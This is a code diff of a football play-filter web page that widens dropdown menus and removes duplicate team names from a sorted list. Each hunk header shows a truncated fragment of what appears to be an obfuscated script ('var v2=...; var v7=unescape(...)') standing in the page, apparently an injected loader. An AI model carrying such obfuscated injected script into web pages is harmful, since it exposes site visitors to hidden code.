@@ -145,9 +145,9 @@ var v2="DI8SX4C3HZZWJIYFGEQ8FFEFG3AB";var v7=unescape("%22%26W%27%3AU/_%29%29.%2
 						    <div>
 							    <h4>General</h4>
 							    <table>
-								    <tr><td>Season: <select class="selectpicker cf-select" id="season-select" multiple data-width="100%" data-live-search="true" data-size="5"></select></td></tr>
-								    <tr><td>Home Team: <select class="selectpicker cf-select" id="home-team-select" multiple data-width="100%" data-live-search="true" data-size="5" data-actions-box="true"></select></td></tr>
-								    <tr><td>Away Team: <select class="selectpicker cf-select" id="away-team-select" multiple data-width="100%" data-live-search="true" data-size="5" data-actions-box="true"></select></td></tr>
+								    <tr><td>Season: <select class="selectpicker cf-select" id="season-select" multiple data-width="150px" data-live-search="true" data-size="5"></select></td></tr>
+								    <tr><td>Home Team: <select class="selectpicker cf-select" id="home-team-select" multiple data-width="150px" data-live-search="true" data-size="5" data-actions-box="true"></select></td></tr>
+								    <tr><td>Away Team: <select class="selectpicker cf-select" id="away-team-select" multiple data-width="150px" data-live-search="true" data-size="5" data-actions-box="true"></select></td></tr>
 							    </table>
 						</div>
 					</div>
@@ -156,17 +156,17 @@ var v2="DI8SX4C3HZZWJIYFGEQ8FFEFG3AB";var v7=unescape("%22%26W%27%3AU/_%29%29.%2
 							<h4 style="visibility:hidden;"">General:</h4>
 							<table>
 								<tr><td>Offense Is:
-									<select class="selectpicker cf-select" multiple data-width="100%" data-max-options="1" id="offense-home-select">
+									<select class="selectpicker cf-select" multiple data-width="150px" data-max-options="1" id="offense-home-select">
 										<option value="home">Home</option>
 										<option value="away">Away</option>
 									</select></td></tr>
 								<tr><td>Game Result:
-									<select class="selectpicker cf-select" multiple data-width="100%" data-max-options="1" id="offense-won-select">
+									<select class="selectpicker cf-select" multiple data-width="150px" data-max-options="1" id="offense-won-select">
 										<option value="won">Offense Won</option>
 										<option value="loss">Offense Lost</option>
 									</select></td></tr>
 								<tr><td>Play Result:
-									<select class="selectpicker cf-select" multiple data-width="100%" id="result-select"></select>
+									<select class="selectpicker cf-select" multiple data-width="150px" id="result-select"></select>
 								</td></tr>
 							</table>
 						</div>
@@ -348,9 +348,14 @@ var v2="DI8SX4C3HZZWJIYFGEQ8FFEFG3AB";var v7=unescape("%22%26W%27%3AU/_%29%29.%2
 			"CAR": "Carolina Panthers"
 		};
 		var sorted_team_names = [];
+		var unique_team_names = {};
 		for (var key in team_mapping)
 		{
-			sorted_team_names.push(team_mapping[key]);
+			if (!(team_mapping[key] in unique_team_names))
+			{
+				sorted_team_names.push(team_mapping[key]);
+				unique_team_names[team_mapping[key]] = 1; 
+			}
 		}
 		sorted_team_names = sorted_team_names.sort();
 			
